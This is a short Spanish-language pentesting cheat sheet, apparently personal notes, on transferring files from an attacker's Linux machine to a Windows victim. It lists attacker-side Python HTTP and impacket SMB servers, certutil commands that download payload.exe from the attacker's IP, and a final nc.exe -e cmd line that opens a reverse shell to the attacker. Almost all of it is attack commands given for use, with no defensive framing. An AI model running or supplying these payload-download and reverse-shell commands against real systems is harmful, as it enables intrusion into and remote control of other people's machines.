# Transferir archivos 

Tags: #Fileshare

## Linux a Windows 

```bash 
# Directorios en donde tienes los permisos de lectura y escritura en Windows 

C:\Temp
C:\Windows\Temp                          
```

```bash 
# Atacante Linux
2. ❯ python -m SimpleHTTPServer 80      # Creamos un servidor para poder pasar los archivos a la maquina Windows
3. ❯ python -m http.server              # Creamos un servidor y por default lo hace por el puerto 8000
4. ❯ impacket-smbserver smbFolder --smb2support
```

```bash 
# Victima Windows 

1. ❯ upload ~/Downloads/file.exe         # Funciona en la sesion de Meterpreter, colocando la ruta absoluta del archivo a subir

2. ❯ certutil -urlcache -f http://IP/payload.exe payload.exe                         # Para descargar el payload de la maquina Linux
	# IP = Direccion de la maquina de atacante Linux
	# payload.exe = Nombre del archivo a descargar en la maquina Windows 
	
3. ❯ certutil.exe -f -urlcache -split http://IP:8000/payload.exe payload.exe         # Para descargar el payload de la maquina Linux
	# IP = Direccion de la maquina de atacante Linux
	# payload.exe = Nombre del archivo a descargar en la maquina Windows 

4. \\\\<IP>\\smbFolder\\nc.exe -e cmd <IP> 443 
```
